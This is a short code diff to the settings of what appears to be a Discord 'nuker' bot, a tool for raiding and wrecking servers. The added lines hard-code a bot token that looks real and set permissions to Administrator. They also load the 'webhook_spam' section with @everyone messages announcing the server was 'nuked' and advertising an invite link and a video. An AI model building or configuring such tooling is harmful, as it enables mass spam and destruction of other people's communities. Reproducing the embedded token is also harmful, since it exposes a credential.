@@ -94,8 +94,8 @@ if version.parse('1.5.1') > version.parse(discord.__version__):
     exit()
 
 settings = {
-        "token": None,
-        "permissions": [],
+        "token": "MTMxMzYwMzUxMDM3NzM4MTk0OQ.GgFg9y.dvcUYKyeWP7kLUcjEcIH0yHiseWFaZPgQAlv5Q",
+        "permissions": [Administrator],
         "bot_permission": "2146958847",
         "command_prefix": ".",
         "bot_status": "offline",
@@ -107,7 +107,7 @@ settings = {
         "webhook_spam": {
             "usernames": ["nuked"],
             "pfp_urls": [None],
-            "contents": ["@everyone"]
+            "contents": ["@everyone nuked by Solar Nukes Community" , "Join Solar Nukes Community https://discord.gg/MFT9pZBMSW" , "https://www.youtube.com/watch?v=Z48O2AnzHNk&list=LL&index=24&pp=gAQBiAQB8AUB"]
         },
         "after": [],
         "proxies": [],
